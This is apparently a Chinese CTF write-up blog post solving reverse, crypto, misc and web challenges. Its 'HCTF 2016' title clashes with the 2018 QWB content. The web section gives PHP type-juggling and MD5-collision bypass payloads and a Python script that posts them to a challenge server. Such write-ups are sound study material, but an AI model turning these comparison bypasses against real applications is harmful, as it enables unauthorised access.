---
layout:     post
title:      "HCTF 2016 Writeup"
subtitle:   "QWB{xxxxxxxxxxxxx}"
date:       2018-03-26 22:00 +0800
author:     "gsfish, ThTsOd, ydh"
header-img: "img/post-bg-hacker.jpg"
tags:
    - CTF
---

# Reverse

## 0x00 simplecheck

下载下来发现是个 zip 文件，打开后发现是 apk，用 jeb 载入并反编译

![01.png](/img/qwbctf-2018-writeup/01.png)

发现 `a` 是验证函数，跟入

![02.png](/img/qwbctf-2018-writeup/02.png)

转成 C 语言，各个位独立，暴力解出 flag

![03.png](/img/qwbctf-2018-writeup/03.png)


# Crypto

## 0x01 streamgame1

根据 `R=int(flag[5:-1],2)` 以及 `len(flag)==25` 推测 flag 为 19 个二进制位，暴力解出 flag 即可

![04.png](/img/qwbctf-2018-writeup/04.png)

## 0x02 streamgame2

和上题一样，根据 `R=int(flag[5:-1],2)` 以及 `len(flag)==27` 推测 flag 为 21 个二进制位，暴力解出 flag 即可

![05.png](/img/qwbctf-2018-writeup/05.png)

## 0x03 streamgame4

和上题一样，根据 `R=int(flag[5:-1],2)` 以及 `len(flag)==27` 推测 `flag` 为 21 个二进制位，这里只验证 key 前 16 个字节，暴力解出 flag 即可

![06.png](/img/qwbctf-2018-writeup/06.png)


# Misc

## 0x04 welcome

下载下来发现是 dib 文件，用 16 进制编辑器打开，发现前 2 个字节是 `BM` 重命名为 bmp 后用 StegSolve 打开。用 Stereogram Solver 偏移量 `offset` 为 80 后发现 flag

![07.png](/img/qwbctf-2018-writeup/07.png)


# Web

## 0x05 Web 签到

第一关网页源码的提示人如下。可用 PHP 弱类型过掉，`param1=QNKCDZO`、`param2=s878926199a`：

```php
if($_POST['param1']!=$_POST['param2'] && md5($_POST['param1'])==md5($_POST['param2'])){
    die("success!");
}
```

第二关将等于换成了全等于，传进去一个数组即可，使 `md5()` 的结果为 `null`。`param1[]=123`、`param2[]=456`。

```php
if($_POST['param1']!==$_POST['param2'] && md5($_POST['param1'])===md5($_POST['param2'])){
    die("success!");
}
```

第三关网页源码如下。由于使用了强制类型转换，传递对象则会转换为对象名称，因此只能使用 MD5 相等的字符串。使用 fastcoll 根据同一个文件生成了两个内容有差异，但 MD5 相同的文件 f1、f2，使用文件的二进制内容作为 param1、param2 参数。

```php
if((string)$_POST['param1']!==(string)$_POST['param2'] && md5($_POST['param1'])===md5($_POST['param2'])){
    die("success!);
}
```

使用脚本如下：

```python
import requests
session = requests.Session()
step1 = session.post("http://39.107.33.96:10000", data={
	"param1": "QNKCDZO",
	"param2": "s878926199a"
})
step2 = session.post("http://39.107.33.96:10000", data={
    "param1[]": "123",
    "param2[]": "456",
})
step3 = session.post("http://39.107.33.96:10000", data={
	"param1": open('f1', 'rb').read(),
	"param2": open('f2', 'rb').read()
})
print(step3.content)
```
